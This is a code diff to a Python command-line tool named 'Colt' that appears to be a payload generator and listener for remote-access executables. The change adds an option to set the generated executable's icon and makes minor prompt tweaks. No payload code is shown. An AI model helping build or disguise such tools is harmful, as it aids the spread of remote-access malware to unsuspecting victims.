@@ -31,13 +31,13 @@ def print_banner():
 
 clear_screen()
 print_banner()
-print("\n[+] enter -h for all available tags")
+print("\n[+] enter -h for all available tags\n")
 
 
 payload_type = None
 
 while True:
-    colt_cm = input(f"\n{BV}Colt >> {RESET}").split()
+    colt_cm = input(f"{BV}Colt >> {RESET}").split()
     if not colt_cm:
         continue
 
@@ -48,11 +48,12 @@ while True:
     parser.add_argument("-CONNECT", "--connect", action="store_true", help="Starts a listener on specified host and port")
     parser.add_argument("-CLEAR", "--clear", action="store_true", help="Clear ui.")
     parser.add_argument("-NAME", "--name", help="Set name of the executable")
+    parser.add_argument("-ICON", "--icon", help="Set the executable's icon")
 
     args = parser.parse_args(colt_cm)
 
     if args.exe:
-        ge.create_exe(args.ip, args.port, args.name)
+        ge.create_exe(args.ip, args.port, args.name, args.icon)
 
     elif args.connect:
         client.listener(args.ip, args.port)
